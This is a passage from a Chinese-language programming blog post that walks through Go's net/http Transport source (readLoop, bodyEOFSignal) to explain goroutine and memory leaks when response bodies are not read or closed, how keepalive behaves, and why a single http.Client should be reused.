pc.maxHeaderResponseSize()</span><br><span class="line">_, err :&#x3D; pc.br.Peek(1)</span><br><span class="line"></span><br><span class="line">pc.mu.Lock()</span><br><span class="line">if pc.numExpectedResponses &#x3D;&#x3D; 0 &#123;</span><br><span class="line">pc.readLoopPeekFailLocked(err)</span><br><span class="line">pc.mu.Unlock()</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">pc.mu.Unlock()</span><br><span class="line"></span><br><span class="line">rc :&#x3D; &lt;-pc.reqch</span><br><span class="line">trace :&#x3D; httptrace.ContextClientTrace(rc.req.Context())</span><br><span class="line"></span><br><span class="line">var resp *Response</span><br><span class="line">if err &#x3D;&#x3D; nil &#123;</span><br><span class="line">resp, err &#x3D; pc.readResponse(rc, trace) &#x2F;&#x2F;从connection中读response</span><br><span class="line">&#125; else &#123;</span><br><span class="line">err &#x3D; transportReadFromServerError&#123;err&#125;</span><br><span class="line">closeErr &#x3D; err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">if pc.readLimit &lt;&#x3D; 0 &#123;</span><br><span class="line">err &#x3D; fmt.Errorf(&quot;net&#x2F;http: server response headers exceeded %d bytes; aborted&quot;, pc.maxHeaderResponseSize())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">select &#123;</span><br><span class="line">case rc.ch &lt;- responseAndError&#123;err: err&#125;:</span><br><span class="line">case &lt;-rc.callerGone:</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">pc.readLimit &#x3D; maxInt64 &#x2F;&#x2F; effictively no limit for response bodies</span><br><span class="line"></span><br><span class="line">pc.mu.Lock()</span><br><span class="line">pc.numExpectedResponses--</span><br><span class="line">pc.mu.Unlock()</span><br><span class="line"></span><br><span class="line">bodyWritable :&#x3D; resp.bodyIsWritable()</span><br><span class="line">hasBody :&#x3D; rc.req.Method !&#x3D; &quot;HEAD&quot; &amp;&amp; resp.ContentLength !&#x3D; 0</span><br><span class="line"></span><br><span class="line">if resp.Close || rc.req.Close || resp.StatusCode &lt;&#x3D; 199 || bodyWritable &#123;</span><br><span class="line">&#x2F;&#x2F; Don&#39;t do keep-alive on error if either party requested a close</span><br><span class="line">&#x2F;&#x2F; or we get an unexpected informational (1xx) response.</span><br><span class="line">&#x2F;&#x2F; StatusCode 100 is already handled above.</span><br><span class="line">alive &#x3D; false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if !hasBody || bodyWritable &#123;</span><br><span class="line">pc.t.setReqCanceler(rc.req, nil)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Put the idle conn back into the pool before we send the response</span><br><span class="line">&#x2F;&#x2F; so if they process it quickly and make another request, they&#39;ll</span><br><span class="line">&#x2F;&#x2F; get this same conn. But we use the unbuffered channel &#39;rc&#39;</span><br><span class="line">&#x2F;&#x2F; to guarantee that persistConn.roundTrip got out of its select</span><br><span class="line">&#x2F;&#x2F; potentially waiting for this persistConn to close.</span><br><span class="line">&#x2F;&#x2F; but after</span><br><span class="line">alive &#x3D; alive &amp;&amp;</span><br><span class="line">!pc.sawEOF &amp;&amp;</span><br><span class="line">pc.wroteRequest() &amp;&amp;</span><br><span class="line">tryPutIdleConn(trace)</span><br><span class="line"></span><br><span class="line">if bodyWritable &#123;</span><br><span class="line">closeErr &#x3D; errCallerOwnsConn</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">select &#123;</span><br><span class="line">case rc.ch &lt;- responseAndError&#123;res: resp&#125;: &#x2F;&#x2F;利用chan将respone数据发送到上层</span><br><span class="line">case &lt;-rc.callerGone:</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Now that they&#39;ve read from the unbuffered channel, they&#39;re safely</span><br><span class="line">&#x2F;&#x2F; out of the select that also waits on this goroutine to die, so</span><br><span class="line">&#x2F;&#x2F; we&#39;re allowed to exit now if needed (if alive is false)</span><br><span class="line">testHookReadLoopBeforeNextRead()</span><br><span class="line">continue</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waitForBodyRead :&#x3D; make(chan bool, 2)</span><br><span class="line">&#x2F;&#x2F;这里是最关键的地方，close函数实际上就是调用了earlyCloseFn函数，后面详细讲</span><br><span class="line">body :&#x3D; &amp;bodyEOFSignal&#123;</span><br><span class="line">body: resp.Body,</span><br><span class="line">earlyCloseFn: func() error &#123;</span><br><span class="line">waitForBodyRead &lt;- false</span><br><span class="line">&lt;-eofc &#x2F;&#x2F; will be closed by deferred call at the end of the function</span><br><span class="line">return nil</span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line">fn: func(err error) error &#123;</span><br><span class="line">isEOF :&#x3D; err &#x3D;&#x3D; io.EOF</span><br><span class="line">waitForBodyRead &lt;- isEOF</span><br><span class="line">if isEOF &#123;</span><br><span class="line">&lt;-eofc &#x2F;&#x2F; see comment above eofc declaration</span><br><span class="line">&#125; else if err !&#x3D; nil &#123;</span><br><span class="line">if cerr :&#x3D; pc.canceled(); cerr !&#x3D; nil &#123;</span><br><span class="line">return cerr</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return err</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp.Body &#x3D; body &#x2F;&#x2F;利用bodyEOFSignal封装body</span><br><span class="line">if rc.addedGzip &amp;&amp; strings.EqualFold(resp.Header.Get(&quot;Content-Encoding&quot;), &quot;gzip&quot;) &#123;</span><br><span class="line">resp.Body &#x3D; &amp;gzipReader&#123;body: body&#125;</span><br><span class="line">resp.Header.Del(&quot;Content-Encoding&quot;)</span><br><span class="line">resp.Header.Del(&quot;Content-Length&quot;)</span><br><span class="line">resp.ContentLength &#x3D; -1</span><br><span class="line">resp.Uncompressed &#x3D; true</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">select &#123;</span><br><span class="line">case rc.ch &lt;- responseAndError&#123;res: resp&#125;:</span><br><span class="line">case &lt;-rc.callerGone:</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Before looping back to the top of this function and peeking on</span><br><span class="line">&#x2F;&#x2F; the bufio.Reader, wait for the caller goroutine to finish</span><br><span class="line">&#x2F;&#x2F; reading the response body. (or for cancellation or death)</span><br><span class="line">select &#123;</span><br><span class="line">&#x2F;&#x2F;内存泄露的元凶</span><br><span class="line">case bodyEOF :&#x3D; &lt;-waitForBodyRead:</span><br><span class="line">pc.t.setReqCanceler(rc.req, nil) &#x2F;&#x2F; before pc might return to idle pool</span><br><span class="line">alive &#x3D; alive &amp;&amp; </span><br><span class="line">bodyEOF &amp;&amp;</span><br><span class="line">!pc.sawEOF &amp;&amp;</span><br><span class="line">pc.wroteRequest() &amp;&amp;</span><br><span class="line">tryPutIdleConn(trace) &#x2F;&#x2F;尝试将connection放回连接池</span><br><span class="line">if bodyEOF &#123;</span><br><span class="line">eofc &lt;- struct&#123;&#125;&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">case &lt;-rc.req.Cancel:</span><br><span class="line">alive &#x3D; false</span><br><span class="line">pc.t.CancelRequest(rc.req)</span><br><span class="line">case &lt;-rc.req.Context().Done():</span><br><span class="line">alive &#x3D; false</span><br><span class="line">pc.t.cancelRequest(rc.req, rc.req.Context().Err())</span><br><span class="line">case &lt;-pc.closech:</span><br><span class="line">alive &#x3D; false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">testHookReadLoopBeforeNextRead()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，负责读response的goroutine会以alive为条件不断循环，这时想让此goroutine退出，需要将alive置为false，但是我们可以看到最后有一个select语句，在一切正常的情况下（下面的几个错误信号不来的情况下）应当是由waitForBodyRead这个chan来推进整个goroutine，但是从上方代码我们可以看到，想让此chan中被写入数据，只有两个回调函数earlyCloseFn和fn，那我们来看看这两个函数应当如何被触发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">func (es *bodyEOFSignal) Read(p []byte) (n int, err error) &#123;</span><br><span class="line">es.mu.Lock()</span><br><span class="line">closed, rerr :&#x3D; es.closed, es.rerr</span><br><span class="line">es.mu.Unlock()</span><br><span class="line">if closed &#123;</span><br><span class="line">return 0, errReadOnClosedResBody</span><br><span class="line">&#125;</span><br><span class="line">if rerr !&#x3D; nil &#123;</span><br><span class="line">return 0, rerr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n, err &#x3D; es.body.Read(p)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">es.mu.Lock()</span><br><span class="line">defer es.mu.Unlock()</span><br><span class="line">if es.rerr &#x3D;&#x3D; nil &#123;</span><br><span class="line">es.rerr &#x3D; err</span><br><span class="line">&#125;</span><br><span class="line">err &#x3D; es.condfn(err)</span><br><span class="line">&#125;</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (es *bodyEOFSignal) Close() error &#123;</span><br><span class="line">es.mu.Lock()</span><br><span class="line">defer es.mu.Unlock()</span><br><span class="line">if es.closed &#123;</span><br><span class="line">return nil</span><br><span class="line">&#125;</span><br><span class="line">es.closed &#x3D; true</span><br><span class="line">if es.earlyCloseFn !&#x3D; nil &amp;&amp; es.rerr !&#x3D; io.EOF &#123;</span><br><span class="line">return es.earlyCloseFn()</span><br><span class="line">&#125;</span><br><span class="line">err :&#x3D; es.body.Close()</span><br><span class="line">return es.condfn(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; caller must hold es.mu.</span><br><span class="line">func (es *bodyEOFSignal) condfn(err error) error &#123;</span><br><span class="line">if es.fn &#x3D;&#x3D; nil &#123;</span><br><span class="line">return err</span><br><span class="line">&#125;</span><br><span class="line">err &#x3D; es.fn(err)</span><br><span class="line">es.fn &#x3D; nil</span><br><span class="line">return err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  终于看到了我们心心念念的Close方法，可以看到Close方法在es.earlyCloseFn != nil &amp;&amp; es.rerr != io.EOF的情况下会触发earlyCloseFn方法（这里有很多情况，后面详细讨论）</p><p>  而当这一条件不满足时，Close方法将会调用condfn方法，仔细看，其实这一方法在上面的Read方法中也会调用，而Read方法实际和io里Reader有关，也就是说Read方法实际在我们读resp.Body的时候会触发（相当于我们在读出Body中数据的过程中会触发这个方法）</p><p>  那么也就是说，如果我们既不读Body中的数据也不调用Close方法，那么这个goroutine和writeloop的goroutine将无法退出（因为writeloop是当readerloop这个goroutine退出时才会退出，可看readloop开头的defer语句），这就将导致大量的goroutine阻塞在select语句无法退出，而且占用了此persistconn，导致连接池中一直无法有空闲的persistconn放回，这会导致HTTP1.1直接退化到1.0（一个http请求一个tcp connection），相关资源也无法被gc回收，最终导致内存泄露的问题。</p><p>  不过从代码上来看，实际上不仅仅是一定要调用Close方法才可以防止内存泄露，实际上如果能将Body数据读完也是可以的，但建议最好还是调用Close方法，因为也许有许多异常状态会发生（其实如果正常读写，并在读完后调用Close方法，类似于我最开始那个正确的程序，那么Close方法的判断条件中es.rerr会一直等于io.EOF，所以不是说调用了Close方法就会关闭读写的goroutine(实际在既读又close的情况下，只要connection不断开，Close方法只是关闭了io.Reader而已，而且connection的异常实际上也不是由Close方法负责，而是由readloop方法中的resp.Close来进行判断，所以实际上Close方法并非是我们所认为的关闭connection，释放资源（除了io.Reader出现错误时，或者没有读body时才是扮演这一角色），绝大多数情况下，Close方法只是用来关闭读取Body的io.Reader,与connection异常并无关联，也不会实际上执行退出goroutine以供gs释放资源的行为）</p><p>  所以在正常情况下（尤其是既Close又read的情况下），调用Close方法实际就是关闭了io.Reader后调用了condfn方法，而且正常情况下，condfn方法中的es.fn其实一直是nil，直到Body中的数据被读完，此时Read方法再次调用condfn方法时，es.fn才会被赋值为之前在readloop中定义的回调函数的地址(猜想这也是为了保证先等上层读完数据之后才继续接着取数据），从而将goroutine不阻塞在select，并把connection重新放回连接池备用（此时goroutine也不会退出，因为err是io.Eof,alive并不会变为false导致退出循环）），当Read操作做完之后，Close方法关闭Reader，调用condfn方法，但这时候es.fn又变为了nil（读body的操作已经做完，es.fn重新变为nil,其实可以它看作驱动器，只有当上层读完数据，需要读写goroutine进行下一次循环时，才会被赋值，执行回调函数，推进整个循环结构的进行，防止阻塞)，故而不会执行任何其余操作了。</p><p>  简而言之，每一个connection都有一对goroutine负责读写，在读写完一次之后，readloop这个routine会负责将这个connection放回连接池，并且俩goroutine都不会退出，等到connection上有新的request时，这两个goroutine将会再次被激活，如此往复。</p><h1 id="KeepAlive机制"><a href="#KeepAlive机制" class="headerlink" title="KeepAlive机制"></a>KeepAlive机制</h1><p>  继续上文，那么什么时候Close函数会被调用并使得goroutine退出呢？那就是当我一开始的代码改为下面这样的时候：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">func doGet(client *http.Client, url string, id int) &#123;</span><br><span class="line">resp, err :&#x3D; client.Get(url)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;io.Copy(ioutil.Discard, resp.Body)</span><br><span class="line">&#x2F;&#x2F;fmt.Println(&quot;copy&quot;)</span><br><span class="line">&#x2F;&#x2F; buf, err :&#x3D; ioutil.ReadAll(resp.Body)</span><br><span class="line">&#x2F;&#x2F; fmt.Printf(&quot;%d: %s -- %v\n&quot;, id, string(buf[0:1]), err)</span><br><span class="line">if err :&#x3D; resp.Body.Close(); err &#x3D;&#x3D; nil &#123;</span><br><span class="line">fmt.Println(&quot;close&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  此时我们不读Body中的数据，直接关闭，那么这个时候，Close函数中的es.rerr会变为nil，从而触发earlyClosefn函数，使得读写goroutine全部退出，connection关闭</p><p>  在这个问题上，我还想讨论一个机制，那就是keepalive的机制，我们都知道keepalive是旨在让connection更多的承载http信息，而不用一个http创建一个tcp，从而节省资源。</p><p>  在go中，我们可以通过Transport的Disablekeepalive选项来选择关闭或者启用，当我们关闭了keepalive机制的时候，那么每一个http请求都会新建一个tcp连接，而每个连接将都不会放入client的连接池中，这意味着所有连接都不可复用，两个负责读写的goroutine也是只处理一个request后立即退出</p><p>  <strong>这里有一点要注意，那就是如果你启用了keepalive选项，并不代表你的所有连接真的可以复用了，因为我在实际测试中发现，如果对方服务器的返回头当中Connection这一项置空，那么哪怕你自己启用了，实际上还是有可能无法复用的，这一点很奇怪，因为我看了不少资料表示http1.1应该是默认keepalive，除非显式指明Connection头为close才会导致不启用复用的情况，但是在实际测试中我发现这在一定程度上不是很准确，并不是所有的都默认启用，有些特例是不会的，例如python的SimpleHttpServer，就是默认不启用，返回的头中也没有keealive，所以具体还是看实现</strong></p><p><strong>做了个实验，证实了就算服务端包头没有connection alive也可能会keepalive，主要还是看服务器具体如何实现的（绝大多数都是默认支持keep的，不管返回包是否写明，因为http1.1默认实现），附上一张抓包图</strong></p><p><img src="/image/Sourcecode/fake-not-keepalive.png" alt="capture"></p><p><strong>可以看见虽然服务器返回头当中没有keepalive（客户端request有keepalive），但是仍然保持了长连接并没有断开，说明还是默认实现了keepalive机制</strong></p><p>  注：我这里举的例子是在两边均同意复用的情况下才称为keepalive机制启用，vice versa。</p><p>  keepalive关闭时分四种情况：</p><p>   首先每次都会新建连接，读写goroutine也都是新的</p><p>  （1）如果我们既读Body数据，也close了body，那么最后导致读写goroutine退出的将是因为下方代码中resp.Close变为true（因为这个标志表示连接已经断开，不可读，并且由于这句判断语句是在goroutine读取了connection之后判断的，所以实际上在第一次的request读完之后就已经变为了false）-&gt;Read方法-&gt;condfn方法-&gt;goroutine解除阻塞，此时由于alive已经变为false，从而使得两个goroutine在下个循环之前退出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if resp.Close || rc.req.Close || resp.StatusCode &lt;&#x3D; 199 || bodyWritable &#123;</span><br><span class="line">&#x2F;&#x2F; Don&#39;t do keep-alive on error if either party requested a close</span><br><span class="line">&#x2F;&#x2F; or we get an unexpected informational (1xx) response.</span><br><span class="line">&#x2F;&#x2F; StatusCode 100 is already handled above.</span><br><span class="line">alive &#x3D; false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  （2）如果我们没有读数据，直接Close了Body，那么最后导致读写goroutine退出的将是由Close方法中es.rerr等于nil导致earlyCloseFn方法被触发，从而直接退出goroutine（er.rerr正常情况下应该是io.EOF，表示body在被正常读取）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if es.earlyCloseFn !&#x3D; nil &amp;&amp; es.rerr !&#x3D; io.EOF &#123;</span><br><span class="line">return es.earlyCloseFn()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  （3）如果我们只读数据，不Close，那么情况和第一种一致,但是如果不Close，那么读body的io.Reader将不会被关闭，没关闭的多了，也可能会内存泄露（因为Close方法代码里有err := es.body.Close()),详情可看下面，写在后面了</p><p>  （4）如果我们不读也不Close，这里由于keepalive本身就被关闭，connection在一次resquest/response后也失效了，但是由于goroutine一直阻塞，无法退出，所以占用的资源一直无法释放,最后会导致内存泄露</p><p>   keepalive开启时也分四种情况：</p><p>   首先每次连接只要连接池中有足够的空闲connection，则不需要新建，可以直接复用，默认情况下每个host对应最多两个connection</p><p>  （1）如果我们既读Body数据，也close了body，那么读写goroutine在keepalive到期之前将不会退出，一直会重复处理connection数据，将connection放回连接池，处理connection数据。。。这样的循环操作，直到keepalive到期，然后就和keepalive关闭时第一种情况一样了</p><p>  （2）如果我们不读数据，直接close，那么keepalive将会失效（其实不是真的失效，只是因为不读数据的情况下，es.rerr为nil，导致goroutine被退出，无法放入连接池以供复用，所以看起来好像是失效了，实际只是我们强行关闭了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">func (es *bodyEOFSignal) Read(p []byte) (n int, err error) &#123;</span><br><span class="line">es.mu.Lock()</span><br><span class="line">closed, rerr :&#x3D; es.closed, es.rerr</span><br><span class="line">es.mu.Unlock()</span><br><span class="line">if closed &#123;</span><br><span class="line">return 0, errReadOnClosedResBody</span><br><span class="line">&#125;</span><br><span class="line">if rerr !&#x3D; nil &#123;</span><br><span class="line">return 0, rerr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n, err &#x3D; es.body.Read(p)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">es.mu.Lock()</span><br><span class="line">defer es.mu.Unlock()</span><br><span class="line">if es.rerr &#x3D;&#x3D; nil &#123;</span><br><span class="line">              &#x2F;&#x2F;因为没有调用read方法，所以es.rerr一直是nil，无法被赋新值，故而close函数中条件被满足了</span><br><span class="line">           es.rerr &#x3D; err</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(&quot;wo zai read han shu zheer&quot;)</span><br><span class="line">err &#x3D; es.condfn(err)</span><br><span class="line">&#125;</span><br><span class="line">return</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  （3）如果我们只读数据，不close，和第一种一致,但是如果不Close，那么读body的io.Reader将不会被关闭，没关闭的多了，也可能会内存泄露（因为Close方法代码里有err := es.body.Close()）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">func (es *bodyEOFSignal) Close() error &#123;</span><br><span class="line">fmt.Println(&quot;wori...&quot;)</span><br><span class="line">es.mu.Lock()</span><br><span class="line">defer es.mu.Unlock()</span><br><span class="line">if es.closed &#123;</span><br><span class="line">return nil</span><br><span class="line">&#125;</span><br><span class="line">es.closed &#x3D; true</span><br><span class="line">      &#x2F;&#x2F;es.rerr应该就是记录reader的上一个状态，如果是EOF，那么说明是正常的读写完成，无需退出goroutine</span><br><span class="line">if es.earlyCloseFn !&#x3D; nil &amp;&amp; es.rerr !&#x3D; io.EOF &#123;</span><br><span class="line">fmt.Print(&quot;i am close&quot;)</span><br><span class="line">return es.earlyCloseFn()</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;正常读数据的话会走到这里而不是在上面的if就返回</span><br><span class="line">        &#x2F;&#x2F;下面这行应该就是关闭了读Body的io.Reader</span><br><span class="line">err :&#x3D; es.body.Close()</span><br><span class="line">fmt.Println(&quot;err is:&quot;, err)</span><br><span class="line">return es.condfn(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  （4）如果我们既不读也不close，那么keepalive将会失效，因为读写goroutine被阻塞，无法将connection放入连接池，导致后续数据传输无法复用connection，只能一个http请求一个tcp连接，最终导致内存泄露。</p><h1 id="另一个小坑点"><a href="#另一个小坑点" class="headerlink" title="另一个小坑点"></a>另一个小坑点</h1><p>  切记不要在每个请求里都新建一个client结构体。。。也就是说下面的代码是错误的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;net&#x2F;http&quot;</span><br><span class="line">&quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">for &#123;</span><br><span class="line">test()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">func test() &#123;</span><br><span class="line">transport :&#x3D; http.Transport&#123;</span><br><span class="line">DisableKeepAlives: true,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client :&#x3D; &amp;http.Client&#123;</span><br><span class="line">Transport: &amp;transport,</span><br><span class="line">Timeout:   10 * time.Second,</span><br><span class="line">&#125;</span><br><span class="line">request, _ :&#x3D; http.NewRequest(&quot;GET&quot;, target, nil)</span><br><span class="line"></span><br><span class="line">resp, err :&#x3D; client.Do(request)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样会导致内存疯长，实测。。。</p><p>而且在源码中，作者也有注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; A Client is an HTTP client. Its zero value (DefaultClient) is a</span><br><span class="line">&#x2F;&#x2F; usable client that uses DefaultTransport.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; The Client&#39;s Transport typically has internal state (cached TCP</span><br><span class="line">&#x2F;&#x2F; connections), so Clients should be reused instead of created as</span><br><span class="line">&#x2F;&#x2F; needed. Clients are safe for concurrent use by multiple goroutines.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; A Client is higher-level than a RoundTripper (such as Transport)</span><br><span class="line">&#x2F;&#x2F; and additionally handles HTTP details such as cookies and</span><br><span class="line">&#x2F;&#x2F; redirects.</span><br></pre></td></tr></table></figure><p>因为client结构底层维护了一个连接池，所以不需要每次都新建，正确代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;net&#x2F;http&quot;</span><br><span class="line">&quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">transport &#x3D; http.Transport&#123;</span><br><span class="line">DisableKeepAlives: true,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client &#x3D; &amp;http.Client&#123;</span><br><span class="line">Transport: &amp;transport,</span><br><span class="line">Timeout:   10 * time.Second,</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">for &#123;</span><br><span class="line">test()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">func test() &#123;</span><br><span class="line"></span><br><span class="line">request, _ :&#x3D; http.NewRequest(&quot;GET&quot;, target, nil)</span><br><span class="line"></span><br><span class="line">resp, err :&#x3D; client.Do(request)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>  其实看似简单的功能背后也有很多玄机，随便看看都是一个个大坑（笑）</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
